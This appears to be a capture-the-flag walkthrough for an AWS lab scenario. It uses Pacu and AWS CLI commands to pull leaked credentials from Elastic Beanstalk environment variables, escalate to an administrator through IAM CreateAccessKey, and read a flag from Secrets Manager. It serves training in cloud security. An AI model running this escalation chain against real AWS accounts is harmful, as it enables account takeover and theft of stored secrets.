# Beanstalk Secrets Walkthrough

## Summary

In this scenario, you are provided with low-privileged AWS credentials. Your task is to enumerate Elastic Beanstalk applications and environments, discover misconfigured environment variables that leak secondary credentials, and then use these credentials to enumerate IAM permissions. By exploiting the ability to create an access key for an administrator user, you will escalate your privileges and ultimately retrieve the final flag stored in AWS Secrets Manager.

## Detailed Walkthrough

### Configuring the AWS Keys

After launching the scenario, you will be provided with an AWS Access Key ID and Secret Access Key for the low-privileged user. Configure your AWS CLI profile with these credentials:

```bash
aws configure --profile beanstalk
```

You will be prompted for the Access Key, Secret Key, Region, and output format. For example:

```bash
AWS Access Key ID: AKIA2HV********
AWS Secret Access Key: v+xInRa11dSj**************
Default region name: us-east-1
Default output format: json
```

Verify your access:

```bash
aws sts get-caller-identity --profile beanstalk
```

### Enumerating Elastic Beanstalk

Use Pacu to enumerate Elastic Beanstalk applications and environments:

```bash
Pacu (beanstalk:imported-beanstalk) > run elasticbeanstalk__enum --region us-east-1
```

The module will list available applications and environments. Notice the misconfigured environment where environment variables reveal secondary credentials.

### Checking Permissions with Pacu

Next, assess the permissions of the low-privileged user by enumerating available IAM actions:

```bash
Pacu (beanstalk:imported-beanstalk) > run iam__bruteforce_permissions --region us-east-1
```

Review the output to understand the limited permissions available on Elastic Beanstalk and IAM.

### Switching to the Secondary User

The Elastic Beanstalk environment stores secondary credentials in its environment variables. Use these credentials to configure a new AWS CLI profile:

```bash
aws configure --profile beanstalk2
```

Verify the secondary user’s access:

```bash
aws sts get-caller-identity --profile beanstalk2
```

### Enumerating IAM with the Secondary User

With the secondary credentials, enumerate IAM permissions:

```bash
Pacu (beanstalk2:imported-beanstalk2) > run iam__enum_permissions
```

This will display additional IAM permissions, including the ability to create an access key for other users.

### Privilege Escalation with CreateAccessKey

Run the privilege escalation scan in Pacu to identify exploitable methods:

```bash
Pacu (beanstalk2:imported-beanstalk2) > run iam__privesc_scan --scan-only
```

Notice that the `CreateAccessKey` method is confirmed as a viable escalation vector. Now execute the method to target the administrator user:

```bash
Pacu (beanstalk2:imported-beanstalk2) > run iam__privesc_scan --user-methods CreateAccessKey
```

Follow the prompts to select the admin user. Pacu will then generate a new access key for the admin user and display the credentials.

### Configuring the Admin Profile

Using the new admin credentials, set up an AWS CLI profile:

```bash
aws configure --profile admin
```

Enter the provided admin Access Key ID and Secret Access Key. Confirm access:

```bash
aws sts get-caller-identity --profile admin
```

### Retrieving the Final Flag

Finally, with admin privileges, run the secrets enumeration module to retrieve the final flag:

```bash
Pacu (beanstalk3:imported-admin) > run secrets__enum --region us-east-1
```

Check the downloaded secrets in the Pacu output directory (typically under `~/.local/share/pacu/<session>/downloads/secrets/`). For example:

```bash
cat ~/.local/share/pacu/beanstalk3/downloads/secrets/secrets_manager/secrets.txt
```

The file should contain the final flag, for example:  
`FLAG{*********************}`
